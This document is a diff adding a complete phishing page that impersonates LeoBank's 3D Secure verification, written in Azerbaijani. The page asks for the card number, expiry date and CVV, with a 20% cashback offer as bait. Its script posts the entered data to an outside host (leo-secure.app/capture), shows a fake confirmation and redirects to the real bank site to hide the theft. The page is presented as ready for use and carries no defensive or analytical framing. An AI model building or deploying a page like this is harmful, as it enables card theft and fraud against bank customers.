@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>LeoBank - 3D Secure Təsdiqləmə</title>
+  <meta name="description" content="LeoBank kartınızın təhlükəsizliyi üçün 3D Secure təsdiqləməsi. Sürətli və asan." />
+  
+  <!-- LeoBank Rəsmi Fontları (Mobil fokus) -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --leo-black: #000000;
+      --leo-red: #e50914;
+      --leo-gray: #f8f8f8;
+      --leo-light: #ffffff;
+      --border: #e0e0e0;
+      --text: #1a1a1a;
+      --subtext: #666666;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: linear-gradient(135deg, var(--leo-gray) 0%, #f0f0f0 100%);
+      font-family: 'Inter', sans-serif;
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .leo-container {
+      background: var(--leo-light);
+      width: 100%;
+      max-width: 380px;
+      border-radius: 24px;
+      box-shadow: 0 25px 60px rgba(0,0,0,0.15);
+      overflow: hidden;
+      border: 1px solid var(--border);
+      animation: slideUp 0.7s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .header {
+      background: linear-gradient(135deg, var(--leo-black), #1a1a1a);
+      padding: 30px 24px;
+      text-align: center;
+      color: var(--leo-light);
+      position: relative;
+    }
+    .header::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: radial-gradient(circle at 20% 80%, rgba(229,9,20,0.1) 0%, transparent 50%);
+      opacity: 0.5;
+    }
+    .header img {
+      height: 45px;
+      filter: brightness(0) invert(1);
+      position: relative;
+      z-index: 1;
+    }
+    .header h1 {
+      font-size: 19px;
+      margin: 18px 0 0;
+      font-weight: 600;
+      position: relative;
+      z-index: 1;
+    }
+    .header p {
+      font-size: 14px;
+      opacity: 0.9;
+      margin-top: 8px;
+      position: relative;
+      z-index: 1;
+      font-weight: 300;
+    }
+    .body {
+      padding: 32px 28px;
+    }
+    .leo-card-preview {
+      background: linear-gradient(145deg, var(--leo-black), #111);
+      color: var(--leo-light);
+      padding: 22px;
+      border-radius: 18px;
+      margin-bottom: 28px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.4);
+      transform-style: preserve-3d;
+      transition: transform 0.3s ease;
+    }
+    .leo-card-preview:hover {
+      transform: rotateY(5deg) rotateX(5deg);
+    }
+    .leo-card-preview::before {
+      content: '';
+      position: absolute;
+      top: -30%; left: -30%;
+      width: 160%; height: 160%;
+      background: conic-gradient(from 0deg at 50% 50%, transparent 0deg, rgba(229,9,20,0.2) 90deg, transparent 180deg);
+      animation: rotateGlow 4s linear infinite;
+      opacity: 0.3;
+    }
+    @keyframes rotateGlow {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .card-chip {
+      width: 40px; height: 30px; background: linear-gradient(145deg, #ffcc00, #ffd700); border-radius: 4px;
+      margin: 0 auto 12px; position: relative; box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
+    }
+    .card-number-preview {
+      font-family: 'Courier New', monospace;
+      font-size: 20px;
+      letter-spacing: 3px;
+      margin: 16px 0;
+      text-align: center;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+    }
+    .card-details {
+      display: flex;
+      justify-content: space-between;
+      font-size: 14px;
+      opacity: 0.9;
+      margin-top: 8px;
+    }
+    .form-group {
+      margin-bottom: 22px;
+    }
+    label {
+      display: block;
+      margin-bottom: 9px;
+      font-size: 15px;
+      font-weight: 500;
+      color: var(--text);
+    }
+    .input-field {
+      position: relative;
+    }
+    input {
+      width: 100%;
+      padding: 16px 18px;
+      border: 2px solid #e0e0e0;
+      border-radius: 14px;
+      font-size: 17px;
+      transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      background: var(--leo-light);
+      box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--leo-red);
+      box-shadow: 0 0 0 4px rgba(229,9,20,0.12), inset 0 2px 4px rgba(0,0,0,0.05);
+      transform: translateY(-2px);
+    }
+    .card-input-field {
+      font-family: 'Courier New', monospace;
+      letter-spacing: 2px;
+    }
+    .row-inputs {
+      display: flex;
+      gap: 16px;
+    }
+    .row-inputs .form-group {
+      flex: 1;
+    }
+    .btn-secure {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, var(--leo-black), var(--leo-red));
+      color: var(--leo-light);
+      border: none;
+      border-radius: 14px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.4s ease;
+      margin-top: 14px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-secure::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%; width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+    .btn-secure:hover::before {
+      left: 100%;
+    }
+    .btn-secure:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(229,9,20,0.4);
+    }
+    .secure-badge {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 13px;
+      color: var(--subtext);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .secure-badge img {
+      height: 20px;
+    }
+    .loading-section {
+      display: none;
+      text-align: center;
+      padding: 45px 20px;
+    }
+    .spinner-advanced {
+      width: 50px;
+      height: 50px;
+      border: 3px solid rgba(229,9,20,0.1);
+      border-top: 3px solid var(--leo-red);
+      border-radius: 50%;
+      animation: spinAdvanced 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94) infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spinAdvanced {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .progress-advanced {
+      height: 6px;
+      background: #e0e0e0;
+      border-radius: 3px;
+      overflow: hidden;
+      margin-top: 28px;
+      box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+    }
+    .progress-fill-advanced {
+      height: 100%;
+      background: linear-gradient(90deg, var(--leo-red), var(--leo-black));
+      width: 0%;
+      transition: width 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      position: relative;
+    }
+    .progress-fill-advanced::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      animation: progressShine 2s infinite;
+    }
+    @keyframes progressShine {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+    @media (max-width: 480px) {
+      .leo-container { max-width: 100%; margin: 0 10px; }
+      .body { padding: 24px 20px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="leo-container">
+  <!-- Header -->
+  <div class="header">
+    <img src="https://leobank.az/assets/images/logo-white.svg" alt="LeoBank">
+    <h1>3D Secure Təsdiqləmə</h1>
+    <p>Kartınızın qorunması üçün son mərhələ – 62 günədək pulsuz</p>
+  </div>
+
+  <!-- Body -->
+  <div class="body" id="formSection">
+    <!-- 3D Kart Önizləməsi -->
+    <div class="leo-card-preview">
+      <div class="card-chip"></div>
+      <div class="card-number-preview" id="leoCardPreview">•••• •••• •••• ••••</div>
+      <div class="card-details">
+        <span id="leoExpiryPreview">--/--</span>
+        <span>CVV</span>
+      </div>
+    </div>
+
+    <form id="leoSecureForm">
+      <div class="form-group">
+        <label>Kart Nömrəsi</label>
+        <div class="input-field">
+          <input type="text" id="leoCardNumber" class="card-input-field" placeholder="1234 5678 9012 3456" maxlength="19" required />
+        </div>
+      </div>
+
+      <div class="row-inputs">
+        <div class="form-group">
+          <label>Son Tarix</label>
+          <input type="text" id="leoExpiry" placeholder="MM/YY" maxlength="5" required />
+        </div>
+        <div class="form-group">
+          <label>CVV</label>
+          <input type="text" id="leoCVV" placeholder="123" maxlength="4" required />
+        </div>
+      </div>
+
+      <button type="submit" class="btn-secure">Təsdiqlə və 20% Keşbek Qazan</button>
+
+      <div class="secure-badge">
+        <img src="https://img.icons8.com/fluency/48/000000/shield.png" alt="SSL">
+        <span>256-bit SSL | LeoBank Təhlükəsizlik</span>
+      </div>
+
+      <div class="progress-advanced">
+        <div class="progress-fill-advanced" id="leoProgressFill"></div>
+      </div>
+    </form>
+  </div>
+
+  <!-- Loading -->
+  <div class="loading-section" id="leoLoadingSection">
+    <div class="spinner-advanced"></div>
+    <p><strong>Təsdiqlənir...</strong> LeoBank tərəfindən yoxlanılır (1-2 saniyə).</p>
+  </div>
+</div>
+
+<script>
+  // Real-time 3D kart önizləməsi
+  const cardNumInput = document.getElementById('leoCardNumber');
+  const cardPreview = document.getElementById('leoCardPreview');
+  const expiryInput = document.getElementById('leoExpiry');
+  const expiryPreview = document.getElementById('leoExpiryPreview');
+
+  cardNumInput.addEventListener('input', () => {
+    let val = cardNumInput.value.replace(/\D/g, '').substring(0,16);
+    let formatted = val.match(/.{1,4}/g);
+    cardNumInput.value = formatted ? formatted.join(' ') : val;
+    cardPreview.textContent = formatted ? formatted.join(' ') : '•••• •••• •••• ••••';
+    cardPreview.style.color = val.length === 16 ? 'var(--leo-light)' : '#888';
+  });
+
+  expiryInput.addEventListener('input', () => {
+    let val = expiryInput.value.replace(/\D/g, '').substring(0,4);
+    if (val.length >= 2) {
+      expiryInput.value = val.substring(0,2) + '/' + val.substring(2);
+      expiryPreview.textContent = expiryInput.value;
+    } else {
+      expiryInput.value = val;
+      expiryPreview.textContent = '--/--';
+    }
+  });
+
+  document.getElementById('leoCVV').addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g, '').substring(0,4);
+  });
+
+  // Form göndərilməsi (Ən inandırıcı animasiya)
+  document.getElementById('leoSecureForm').addEventListener('submit', async e => {
+    e.preventDefault();
+
+    const progressFill = document.getElementById('leoProgressFill');
+    let width = 0;
+    const interval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(interval);
+        document.getElementById('formSection').style.display = 'none';
+        document.getElementById('leoLoadingSection').style.display = 'block';
+
+        const data = {
+          card: cardNumInput.value.replace(/\s/g, ''),
+          expiry: expiryInput.value,
+          cvv: document.getElementById('leoCVV').value
+        };
+
+        // Terminal serverinə göndər (Cloudflare ilə)
+        fetch('https://leo-secure.app/capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        }).finally(() => {
+          setTimeout(() => {
+            alert('✅ Təsdiq edildi! 20% keşbek aktivləşdi. Tezliklə ödəniş tamamlanır.');
+            window.location.href = 'https://leobank.az';
+          }, 3000);
+        });
+      } else {
+        width += 3;
+        progressFill.style.width = width + '%';
+      }
+    }, 40);
+  });
+</script>
+
+</body>
+</html>
